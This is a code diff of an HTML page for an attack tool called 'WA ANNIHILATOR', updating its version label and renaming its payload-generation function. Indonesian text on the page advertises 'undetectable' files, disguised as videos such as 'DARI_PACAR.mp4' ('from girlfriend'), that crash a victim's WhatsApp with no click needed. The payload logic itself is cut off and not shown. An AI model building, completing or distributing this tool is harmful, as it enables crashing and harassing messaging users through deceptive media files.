@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>WA ANNIHILATOR v6.0 - UNDETECTABLE</title>
+  <title>WA ANNIHILATOR v7.0 - UNDETECTABLE</title>
   <style>
     * {
       margin: 0;
@@ -99,7 +99,7 @@
 </head>
 <body>
   <div class="container">
-    <h1>☠️ WA ANNIHILATOR v6.0</h1>
+    <h1>☠️ WA ANNIHILATOR v7.0</h1>
     <h2>UNDETECTABLE - SILENT KILL</h2>
     <p class="subtitle">
       File terlihat normal, tidak terdeteksi, tidak muncul peringatan. Korban tidak perlu klik — WA crash otomatis.
@@ -124,7 +124,7 @@
       <input type="text" id="customName" placeholder="Masukkan nama menarik" value="DARI_PACAR.mp4" />
     </div>
 
-    <button onclick="generateUndetectablePayload()">🔥 GENERATE & DOWNLOAD</button>
+    <button onclick="generateFinalPayload()">🔥 GENERATE & DOWNLOAD</button>
 
     <pre id="result"></pre>
 
@@ -145,7 +145,7 @@
       document.getElementById('customName').value = names[type];
     });
 
-    function generateUndetectablePayload() {
+    function generateFinalPayload() {
       const file = document.getElementById('inputFile').files[0];
       const fileType = document.getElementById('fileType').value;
       const customName = document.getElementById('customName').value.trim() || "video.mp4";
